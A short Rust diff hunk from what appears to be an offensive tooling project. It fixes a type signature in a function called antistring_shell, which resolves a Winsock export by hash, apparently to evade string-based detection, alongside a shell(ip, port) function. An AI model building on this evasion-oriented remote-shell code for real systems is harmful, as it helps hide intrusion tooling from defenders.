@@ -150,7 +150,7 @@ pub fn shell(ip: &str, port: u16) {
 pub fn antistring_shell(ip: &str, port: u16) {
     // See line 16
     let function = rco_utils::find_function_address("Ws2_32", 0xedf45b56dba24418).unwrap();
-    let function = rco_utils::test!(function; [u16, WSAData]; [()]);
+    let function = rco_utils::test!(function; [u16, &mut WSAData]; [()]);
     function(WSASTARTUPVAL, &mut WSAData::default());
     /*unsafe { 
         mem::transmute::<*const (), fn(u16, WSAData)>
